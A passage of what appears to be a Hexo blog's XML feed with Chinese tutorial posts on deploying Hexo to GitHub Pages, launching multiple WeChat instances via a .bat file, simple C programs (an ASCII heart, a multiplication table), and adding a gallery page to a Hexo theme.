src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170348.png" alt=""></p><p>安装部署插件：<br><code>npm install hexo-deployer-git --save</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170349.png" alt=""></p><p>访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170408.png" alt=""></p><p>配置Git用户名邮箱<br><code>git config --global user.name "此处填写你注册时的用户名"</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170350.png" alt=""></p><p><code>git config --global user.email "此处填写你注册时的邮箱"</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170351.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170352.png" alt=""></p><blockquote><p>生成的<strong>.ssh</strong>和<strong>.gitconfig</strong>文件夹和文件要妥善保管，切勿丢失。（最好多备份一下，这个连接Github的凭证）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170353.png" alt=""></p><p>本地博客发布到Github Pages<br>首先需要安装发布的插件，在站点目录下执行下面的命令，也就是创建的博客目录下：<br><code>npm install hexo-deployer-git --save</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170354.png" alt=""></p><p>紧接着，将本地目录与GitHub关联起来，输入下面的命令行：<br><code>ssh-keygen -t rsa -C "你的邮箱地址"</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170355.png" alt=""></p><p>复制本地Key填入Github</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170357.png" alt=""></p><p>找到Settings</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170356.png" alt=""></p><p>点击SSH开头的选项</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170358.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170359.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170400.png" alt=""></p><p>新建项目<del>托管库</del></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170401.png" alt=""></p><p>然后回到Git的命令行界面，测试一下是否与GitHub连接成功。输入下面的命令行：<br><code>ssh -T git@github.com</code></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170403.png" alt=""></p><p>最后修改博客配置_config.yml</p><p>ssh key配置好之后</p><p>deploy正确配置姿势</p><pre><code>deploy:   type: git   repository: git@github.com:lateral404/lateral404.github.io.git   branch: master</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170404.png" alt=""></p><p>输入Hexo d -g 部署并渲染</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170405.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170406.png" alt=""></p><p>最后访问  用户名.github.io</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200120170407.png" alt=""></p><p>换主题手法：<br>找到_config.yml文件<br>theme: 后面的值改为 主题名称</p><p>到此博客就搭建完成！！！</p><p>基本上跟着命令走搭建博客没啥问题。</p><p>常用操作 常用的hexo命令无非是6个</p><p><code>hexo clean</code> 清空生成目录</p><p><code>hexo g</code> 生成网站文件</p><p><code>gulp default</code> 这个命令相当于 hexo clean &amp;&amp; hexo g 并且再把代码和图片压缩。</p><p><code>hexo s</code> 打开本地服务 localhost:4000</p><p><code>hexo d</code> 将文件部署到github page</p><p><code>gulp build</code> 在最后又加了个 hexo d ，等于说生成、压缩文件后又帮你自动部署Github了。</p><p><code>hexo new xxx</code> 新建一篇文章xxx</p><p><code>hexo new page xxx</code> 新建一个页面xxx</p><ul><li>最全的头部格式</li></ul><pre><code>---title: 标题date: 2020-01-29 19:52:00author: Cat00011catimg: /source/images/xxx.jpg / http://images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><h2 id="文章-Front-介绍"><a href="#文章-Front-介绍" class="headerlink" title="文章 Front-介绍"></a>文章 Front-介绍</h2><p>Front-matter 选项详解</p><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">开源中国在线工具</a>、<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">站长工具</a>。</li></ol></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bat实现微信电脑版多开</title>
      <link href="/posts/19932.html"/>
      <url>/posts/19932.html</url>
      
        <content type="html"><![CDATA[<p><strong>新建一个.txt文本，输入下面的代码</strong></p><p><em>根据自己微信实际安装路径，修改代码</em></p><p>路径查看方式：</p><p>右键微信-属性-目标</p><p><strong>需要多开几个微信就复制几行代码就行。</strong></p><p>格式：</p><pre><code>start D:\"xxxxx"\WeChat\WeChat.exe</code></pre><pre><code>修改前D:\微信PC\WeChat\WeChat.exe修改后start D:\"微信PC"\WeChat\WeChat.exestart D:\"微信PC"\WeChat\WeChat.exestart D:\"微信PC"\WeChat\WeChat.exe这里我就同时开3个微信，开几个就写几行代码</code></pre><p><strong>效果</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111222828.png" alt=""></p><p><strong>注意</strong><br>‘不要用原来地址中的引号，’<br>‘切换英文输入状态下自己输入’</p><blockquote><p>将文件另存为，重命名<code>xxx.bat</code>保存类型【所有文件】编码【ANSI】最后点击保存<br>一定要带.bat后缀</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -IT技术 -编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用C语言画出一个“爱心”，撩妹技能杠杠的</title>
      <link href="/posts/30937.html"/>
      <url>/posts/30937.html</url>
      
        <content type="html"><![CDATA[<h5 id="用C语言画出一个“爱心”，撩妹技能杠杠的"><a href="#用C语言画出一个“爱心”，撩妹技能杠杠的" class="headerlink" title="用C语言画出一个“爱心”，撩妹技能杠杠的"></a>用C语言画出一个“爱心”，撩妹技能杠杠的</h5><h2 id="编程之美-源于发现"><a href="#编程之美-源于发现" class="headerlink" title="编程之美 源于发现"></a>编程之美 源于发现</h2><h5 id="用C语言，编写自己人生的源代码！！！"><a href="#用C语言，编写自己人生的源代码！！！" class="headerlink" title="用C语言，编写自己人生的源代码！！！"></a>用C语言，编写自己人生的源代码！！！</h5><p><del>学习C语言虽然乏味，枯燥。但是我们可以在玩中学，可以自己输出一些字符画，来放松心情。</del></p><p><strong>爱心字符画代码如下;</strong></p><pre><code>       #include &lt;stdio.h&gt;       int main() {          for (float y = 1.5f; y &gt; -1.5f; y -= 0.1f) {           for (float x = -1.5f; x &lt; 1.5f; x += 0.05f) {              float a = x * x + y * y - 1;                 putchar(a * a * a - x * x * y * y * y &lt;= 0.0f ? '*' : ' ');                     }           putchar('\n');                }           } </code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111221604.png" alt=""></p><h4 id="程序运行效果图"><a href="#程序运行效果图" class="headerlink" title="程序运行效果图:"></a>程序运行效果图:</h4><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111221654.png" alt=""></p><p><strong>在学习中，寻找灵感，不断TOP C语言编程的种种局限和不可能！！！</strong></p><h2 id="只有想不到，没有做不到！！！"><a href="#只有想不到，没有做不到！！！" class="headerlink" title="只有想不到，没有做不到！！！"></a>只有想不到，没有做不到！！！</h2><p>哈哈哈哈嗝，，我要拿它去<del>找女友了</del>哈哈哈哈嗝，，正经事要紧。。。。。哈哈哈哈哈哈嗝<del>~</del></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言的for循环输出九九乘法口诀表</title>
      <link href="/posts/24151.html"/>
      <url>/posts/24151.html</url>
      
        <content type="html"><![CDATA[<h4 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h4><p>编译器用的VC6.0</p><pre><code>   #include&lt;stdio.h&gt;   #include&lt;iostream&gt;   int main() { int row, column;      //row为行，column为列     for (row = 1; row &lt;= 9; row++)   {  for (column = 1; column &lt;= row; column++){ printf("%d*%d=%d  ", row, column, row*column);   }     printf("\n"); }     system("pause");     return 0; } </code></pre><h4 id="如图"><a href="#如图" class="headerlink" title="如图"></a>如图</h4><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111220836.png" alt=""></p><h4 id="接着"><a href="#接着" class="headerlink" title="接着"></a>接着</h4><p>我们用编译器运行输出效果如图：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111221106.png" alt=""></p><p><del>怎么样？？以后再也不怕背不出乘法口诀表啦，</del></p><p>哈哈哈哈哈<del>~</del>哈哈哈哈哈 嗝。。。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo博客添加一级分类相册功能</title>
      <link href="/posts/22522.html"/>
      <url>/posts/22522.html</url>
      
        <content type="html"><![CDATA[<h4 id="1、添加【相册】菜单"><a href="#1、添加【相册】菜单" class="headerlink" title="1、添加【相册】菜单"></a>1、添加【相册】菜单</h4><p>这里要修改几个文件：</p><p>该主题的配置文件<code>_config.yml</code>  ，不要跟站点根目录下的同名文件搞混了，在<code>menu</code>下添加以下代码:</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">Galleries</span><span class="token punctuation">:</span>    <span class="token key atrule">url</span><span class="token punctuation">:</span> /galleries    <span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>image</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170906.png" alt=""></p><p>该主题的语言配置文件目录 <code>languages</code>下的 <code>default.yml</code>和<code>zh-CN.yml</code>，分别是英文和中文的配置文件，分别添加以下内容，</p><pre class=" language-yaml"><code class="language-yaml"><span class="token key atrule">galleries</span><span class="token punctuation">:</span> galleries<span class="token key atrule">galleries</span><span class="token punctuation">:</span> 相册</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170907.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170919.png" alt=""></p><p>题目录下<code>layout/_partial/navigation.ejs</code>和<code>layout/_partial/mobile-nav.ejs</code>文件里添加</p><pre class=" language-js"><code class="language-js">menuMap<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">"Galleries"</span><span class="token punctuation">,</span> <span class="token string">"相册"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170912.png" alt=""></p><p>至于添加到什么位置，你打开文件就知道了，里面会有类似格式的代码，很容易找到的。</p><p>做完以上操作后，你就会发现<code>相册</code>的菜单已经出现了：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170918.png" alt=""></p><p>点击就能跳转到<code>galleries</code>下，然而浏览器会提示你：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170903.png" alt=""></p><p>因为站点下并没有<code>galleries/index.html</code>这个文件，如何生成这个文件呢?<br>在站点根目录<code>source</code>下新建<code>galleries</code>目录，然后在该目录下新建<code>index.md</code>，就会生成<code>index.html</code>文件了，然而却是这个效果：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170913.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170917.png" alt=""></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170914.png" alt=""></p><h4 id="2、生成相册目录和相册列表"><a href="#2、生成相册目录和相册列表" class="headerlink" title="2、生成相册目录和相册列表"></a>2、生成相册目录和相册列表</h4><p>这是为什么呢？因为hexo把这个文件当成一个普通的文章来渲染了，而我们需要自定义样式，不能让它渲染成普通的文章。要让它渲染成一个<code>layout</code>,也就是我们自定义的模板。需要以下操作：<br>在<code>index.md</code>文件里添加以下内容，注意，那几个中划线也不要少了。</p><hr><p>title: 相册</p><h2 id="layout-“galleries”"><a href="#layout-“galleries”" class="headerlink" title="layout: “galleries”"></a>layout: “galleries”</h2><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170902.png" alt=""></p><p>首先添加自定义CSS样式文件，该<code>主题</code>目录下的<code>source/css</code>里新建<code>gallery.css</code>文件，复制以下css样式进去：</p><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.gallery-wrapper</span></span><span class="token punctuation">{</span>  <span class="token property">padding-top</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.gallery-wrapper</span> <span class="token class">.gallery-box</span></span><span class="token punctuation">{</span>  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">5</span>px <span class="token important">!important</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.gallery-wrapper</span> <span class="token class">.gallery-item</span> </span><span class="token punctuation">{</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span><span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>  <span class="token property">padding-bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>  <span class="token property">-moz-box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">3</span>px <span class="token number">0</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token property">-webkit-box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">3</span>px <span class="token number">0</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">3</span>px <span class="token number">0</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.gallery-cover-box</span></span><span class="token punctuation">{</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token property">padding-top</span><span class="token punctuation">:</span> <span class="token number">60%</span><span class="token punctuation">;</span>  <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>  <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>  <span class="token property">background</span><span class="token punctuation">:</span> center center no-repeat<span class="token punctuation">;</span>  <span class="token property">-webkit-background-size</span><span class="token punctuation">:</span> cover<span class="token punctuation">;</span>  <span class="token property">background-size</span><span class="token punctuation">:</span> cover<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.gallery-cover-box</span> <span class="token class">.gallery-cover-img</span> </span><span class="token punctuation">{</span>  <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>  <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>  <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>  <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>  <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">50%</span>,-<span class="token number">50%</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.gallery-item</span> <span class="token class">.gallery-name</span></span><span class="token punctuation">{</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>  <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">24</span>px<span class="token punctuation">;</span>  <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>  <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#666</span><span class="token punctuation">;</span>  <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.waterfall</span> </span><span class="token punctuation">{</span>  <span class="token property">column-count</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">;</span>  <span class="token property">column-gap</span><span class="token punctuation">:</span> <span class="token number">1</span>em<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.photo-wrapper</span></span><span class="token punctuation">{</span>  <span class="token property">padding-top</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.photo-item</span> </span><span class="token punctuation">{</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>  <span class="token property">padding-bottom</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token property">-moz-page-break-inside</span><span class="token punctuation">:</span> avoid<span class="token punctuation">;</span>  <span class="token property">-webkit-column-break-inside</span><span class="token punctuation">:</span> avoid<span class="token punctuation">;</span>  <span class="token property">break-inside</span><span class="token punctuation">:</span> avoid<span class="token punctuation">;</span>  <span class="token property">background</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>  <span class="token property">-moz-box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">3</span>px <span class="token number">0</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token property">-webkit-box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">3</span>px <span class="token number">0</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.22</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token property">box-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">1</span>px <span class="token number">3</span>px <span class="token number">0</span> <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0</span>, <span class="token number">0.22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.photo-item</span> img </span><span class="token punctuation">{</span>  <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.photo-item</span> <span class="token class">.photo-name</span></span><span class="token punctuation">{</span>  <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>  <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>  <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>  <span class="token property">margin-top</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>  <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>  <span class="token property">border-top</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid <span class="token hexcode">#dddddd</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*适配移动端布局*/</span><span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 601px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>  <span class="token selector"><span class="token class">.waterfall</span> </span><span class="token punctuation">{</span>    <span class="token property">column-count</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token property">column-gap</span><span class="token punctuation">:</span> <span class="token number">1</span>em<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111170908.png" alt=""></p><p>在该主题<code>layout</code>目录下新建<code>galleries.ejs</code>文件，添加以下代码：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/css/gallery.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;%- partial('_partial/bg-cover') %><span class="token tag"><span class="token tag"><span class="token 